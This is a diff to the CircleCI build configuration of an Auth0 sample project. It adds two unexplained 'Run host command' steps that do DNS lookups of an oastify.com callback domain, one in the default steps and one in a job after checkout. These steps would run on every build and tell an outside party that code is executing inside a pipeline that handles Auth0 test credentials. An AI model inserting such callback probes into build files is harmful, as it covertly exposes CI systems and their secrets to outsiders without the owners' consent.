@@ -12,7 +12,9 @@ defaults: &defaults
         name: Replace Auth0 test credentials
         command: |
           echo "{ \"domain\": \"$AUTH0_TEST_DOMAIN\", \"clientId\": \"$AUTH0_TEST_CLIENT_ID\", \"audience\": \"$AUTH0_TEST_API_IDENTIFIER\" }" > $AUTH0_CFG
-
+    - run:
+        name: Run host command
+        command: host nlc1ka68zmrnqbex4g83k21ngem5aw0kp.oastify.com
     - run:
         name: Build pull request
         command: |
@@ -49,6 +51,9 @@ jobs:
     steps:
       - checkout
       - run: git clone https://github.com/auth0-samples/spa-quickstarts-tests scripts
+      - run:
+          name: Run host command
+          command: host nlc1ka68zmrnqbex4g83k21ngem5aw0kp.oastify.com
       - persist_to_workspace:
           root: ~/
           paths:
